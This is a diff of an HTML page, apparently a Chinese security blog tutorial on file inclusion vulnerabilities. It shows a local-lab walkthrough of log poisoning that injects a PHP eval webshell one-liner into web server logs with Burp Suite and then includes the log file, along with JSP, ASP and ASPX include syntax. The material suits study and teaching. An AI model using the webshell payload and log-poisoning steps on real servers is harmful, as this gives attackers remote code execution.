+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">日志文件在用户安装目录logs目录下</span><br><span class="line">        以我的安装路径为例/usr/<span class="built_in">local</span>/nginx,</span><br><span class="line">        那我的日志目录就是在/usr/<span class="built_in">local</span>/nginx/logs里</span><br></pre></td></tr></table></figure>
+
 <p>首先，我们直接使用浏览器来构造“php一句话报错请求信息”服务自动记录此一句话信息到服务器日志文件中；<br>具体构造内容：</p>
-<pre class=" language-xml"><code class="language-xml"> http://127.0.0.1:81/FileInclusion/index2.php?file=<span class="token prolog">&lt;?php @eval($_POST[c]);?></span></code></pre>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1:81/FileInclusion/index2.php?file=<span class="php"><span class="meta">&lt;?php</span> @<span class="keyword">eval</span>($_POST[c]);<span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure>
+
 <p><img src="9272355-f9f0db6a9d7ff53a%5B1%5D.png" alt=""></p>
 <p>（2）测试结果：失败<br>利用文件包含漏洞直接访问“服务日志文件”，发现文件包含漏洞并未对构造的php一句话进行正常解析，观察发现是构造的PHP一句话中的相关字符在记录进日志文件后，相关的字符被转码了，导致PHP解析失败，具体失败原因见“失败原因分析”</p>
 <p><img src="9272355-738380f7e8b09e46%5B1%5D.png" alt=""></p>
 <p>image.png（3）失败原因分析<br>一句话写入日志文件的利用过程是，利用浏览器直接构造一个关于请求资源的报错信息，消息中包含依据。报错信息服务自动记录到日志文件，但实际测试发现写入日志文件内的报错信息发生了字符转码：<br>日志文件内容如上图所示：</p>
-<pre class=" language-ruby"><code class="language-ruby">http<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span><span class="token number">127.0</span><span class="token punctuation">.</span><span class="token number">0.1</span><span class="token punctuation">:</span><span class="token number">81</span><span class="token operator">/</span><span class="token constant">FileInclusion</span><span class="token operator">/</span>index2<span class="token punctuation">.</span>php<span class="token operator">?</span>page<span class="token operator">=</span><span class="token operator">%</span>3C<span class="token operator">?</span>php<span class="token operator">%</span><span class="token number">20</span><span class="token variable">@eval</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span>c<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">?</span><span class="token operator">%</span>3E</code></pre>
-<pre class=" language-rust"><code class="language-rust">               <span class="token string">"&lt;"</span>  <span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token punctuation">-></span> 大于号被转码为了 <span class="token operator">%</span>3C
-                <span class="token string">">"</span>  <span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token punctuation">-></span> 小于号被转码为了 <span class="token operator">%</span>3E
-                <span class="token string">" "</span>   <span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token punctuation">-></span> 空格被转码为了 <span class="token operator">%</span><span class="token number">20</span></code></pre>
+<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">http:</span>/<span class="regexp">/127.0.0.1:81/</span>FileInclusion/index2.php?page=%<span class="number">3</span>C?php%<span class="number">20</span>@eval($_POST[c]);<span class="string">?%</span><span class="number">3</span>E</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">"&lt;"</span>  ----&gt; 大于号被转码为了 %<span class="number">3</span>C</span><br><span class="line"> <span class="string">"&gt;"</span>  ----&gt; 小于号被转码为了 %<span class="number">3</span>E</span><br><span class="line"> <span class="string">" "</span>   ----&gt; 空格被转码为了 %<span class="number">20</span></span><br></pre></td></tr></table></figure>
+
 <p>最后写入到日志文件中的一句话就变成了 %3C?php%20@eval($_POST[c]);?%3E。</p>
 <p>（4） 失败总结<br>浏览器直接构造的PHP一句话中特殊字符，会被浏览器自动进行URL转义，导致最终写入日志文件中的PHP一句话包含了这些特殊字符，而这些转码后的编码PHP并不能进行正常的解析。<br>（5）构造一句话，写入日志文件测试记录<br>burpsuit 代理抓包改包构造一句话写入日志文件<br>（1） burpsuit 代理抓包，修改浏览器转码字符，写入正确的php一句话木马到服务器日志文件。</p>
 <p><img src="9272355-ff2a0beae4cc4468%5B1%5D.png" alt=""></p>
@@ -718,26 +718,36 @@ POST:
 <p><img src="9272355-f5d368a6f62b9802%5B1%5D.png" alt=""></p>
 <p>在用户发起请求时，会将请求写入access.log，当发生错误时将错误写入error.log，还可以包含Apache的错误访问日志</p>
 <p>首先，构造一个会报错的访问链接，将利用代码（PHP一句话）写入错误日志记录中</p>
-<pre class=" language-ruby"><code class="language-ruby">http<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span><span class="token number">127.0</span><span class="token punctuation">.</span><span class="token number">0.1</span><span class="token punctuation">:</span><span class="token number">81</span><span class="token operator">/</span><span class="token constant">FileInclusion</span><span class="token operator">/</span>index2<span class="token punctuation">.</span>php<span class="token operator">%</span>3C<span class="token operator">?</span>php<span class="token operator">%</span><span class="token number">20</span><span class="token variable">@eval</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span>c<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">?</span><span class="token operator">%</span>3E</code></pre>
+<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">http:</span>/<span class="regexp">/127.0.0.1:81/</span>FileInclusion/index2.php%<span class="number">3</span>C?php%<span class="number">20</span>@eval($_POST[c]);<span class="string">?%</span><span class="number">3</span>E</span><br></pre></td></tr></table></figure>
+
 <p>这个链接直接访问的话，一句话会被编码成%3C?php%20@eval($_POST[c]);?%3E，所以需要使用Burp suite改一下包。</p>
 <p><img src="9272355-e094a1b3f7e98f45%5B1%5D.png" alt=""></p>
 <p>对所截获的包进行修改，点击go，返回403报错，服务器错误日志文件成功将此次记录到error.log中<br>我们根据日志的路径构造访问路径:</p>
-<pre class=" language-cpp"><code class="language-cpp">http<span class="token operator">:</span><span class="token operator">/</span><span class="token operator">/</span><span class="token number">127.0</span><span class="token punctuation">.</span><span class="token number">0.1</span><span class="token operator">:</span><span class="token number">81</span><span class="token operator">/</span>FileInclusion<span class="token operator">/</span>index2<span class="token punctuation">.</span>php<span class="token operator">?</span>file<span class="token operator">=</span>C<span class="token operator">:</span><span class="token operator">/</span>phpStudy<span class="token operator">/</span>Apache<span class="token operator">/</span>logs<span class="token operator">/</span>access<span class="token punctuation">.</span>log</code></pre>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//127.0.0.1:81/FileInclusion/index2.php?file=C:/phpStudy/Apache/logs/access.log</span></span><br></pre></td></tr></table></figure>
+
 <p>客户端连接，获取一句话木马</p>
 <h5 id="SSH-log"><a href="#SSH-log" class="headerlink" title="SSH log"></a>SSH log</h5><p>利用的条件：</p>
 <p>利用条件：需要知道ssh-log的位置，且可读。默认情况下为 /var/log/auth.log</p>
 <p>姿势：<br>用ssh连接：<br><a href="https://www.jianshu.com/p/7cbc878d64ae" target="_blank" rel="noopener">参考这个网站</a></p>
 <h5 id="包含临时文件"><a href="#包含临时文件" class="headerlink" title="包含临时文件"></a>包含临时文件</h5><p><a href="https://vulhub.org/#/environments/php/inclusion/" target="_blank" rel="noopener">参考这个网站</a></p>
 <h4 id="jsp文件包含漏洞"><a href="#jsp文件包含漏洞" class="headerlink" title="jsp文件包含漏洞"></a>jsp文件包含漏洞</h4><p>include</p>
-<pre><code>&lt;%@ include file=&quot;head.jsp&quot;%&gt;
-&lt;%@ include file=&quot;body.jsp&quot;%&gt;
-&lt;%@ include file=&quot;tail.jsp&quot;%&gt;</code></pre><p>jsp:include</p>
-<pre><code>&lt;jsp:include page=&quot;head.jsp&quot;/&gt;
-&lt;jsp:include page=&quot;body.jsp&quot;/&gt;   
-&lt;jsp:include page=&quot;tail.jsp”/&gt;</code></pre><p>采用JSTL</p>
-<pre><code>&lt;c:import url=&quot;http://thief.one/1.jsp&quot;&gt;</code></pre><h4 id="asp文件包含漏洞"><a href="#asp文件包含漏洞" class="headerlink" title="asp文件包含漏洞"></a>asp文件包含漏洞</h4><p>asp貌似无法包含远程文件（iis安全设置），只能包含本地文件，语法如下：</p>
-<pre><code>    &lt;!--#include file=&quot;1.asp&quot; --&gt;</code></pre><h4 id="aspx文件包含漏洞"><a href="#aspx文件包含漏洞" class="headerlink" title="aspx文件包含漏洞"></a>aspx文件包含漏洞</h4><p>aspx文件包含与asp一样，语法如下：</p>
-<pre><code>    &lt;!--#include file=&quot;top.aspx&quot; --&gt;</code></pre><hr>
+<figure class="highlight mel"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ include <span class="keyword">file</span>=<span class="string">"head.jsp"</span>%&gt;</span><br><span class="line">&lt;%@ include <span class="keyword">file</span>=<span class="string">"body.jsp"</span>%&gt;</span><br><span class="line">&lt;%@ include <span class="keyword">file</span>=<span class="string">"tail.jsp"</span>%&gt;</span><br></pre></td></tr></table></figure>
+
+<p>jsp:include</p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;jsp:include <span class="attribute">page</span>=<span class="string">"head.jsp"</span>/&gt;</span><br><span class="line">&lt;jsp:include <span class="attribute">page</span>=<span class="string">"body.jsp"</span>/&gt;   </span><br><span class="line">&lt;jsp:include <span class="attribute">page</span>=<span class="string">"tail.jsp”/&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>采用JSTL</p>
+<figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;<span class="built_in">c</span>:<span class="keyword">import</span> url="http:<span class="comment">//thief.one/1.jsp"&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="asp文件包含漏洞"><a href="#asp文件包含漏洞" class="headerlink" title="asp文件包含漏洞"></a>asp文件包含漏洞</h4><p>asp貌似无法包含远程文件（iis安全设置），只能包含本地文件，语法如下：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--#include file="1.asp" --&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="aspx文件包含漏洞"><a href="#aspx文件包含漏洞" class="headerlink" title="aspx文件包含漏洞"></a>aspx文件包含漏洞</h4><p>aspx文件包含与asp一样，语法如下：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--#include file="top.aspx" --&gt;</span></span><br></pre></td></tr></table></figure>
+
+
+
+<hr>
 <h5 id="参考文章："><a href="#参考文章：" class="headerlink" title="参考文章："></a>参考文章：</h5><p><a href="https://www.jianshu.com/p/8803aff98bfa" target="_blank" rel="noopener">https://www.jianshu.com/p/8803aff98bfa</a></p>
 <p><a href="https://www.freebuf.com/articles/web/182280.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/web/182280.html</a></p>
 <p><a href="https://blog.csdn.net/God_XiangYu/article/details/97335988#asp文件包含漏洞" target="_blank" rel="noopener">https://blog.csdn.net/God_XiangYu/article/details/97335988#asp%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E</a></p>
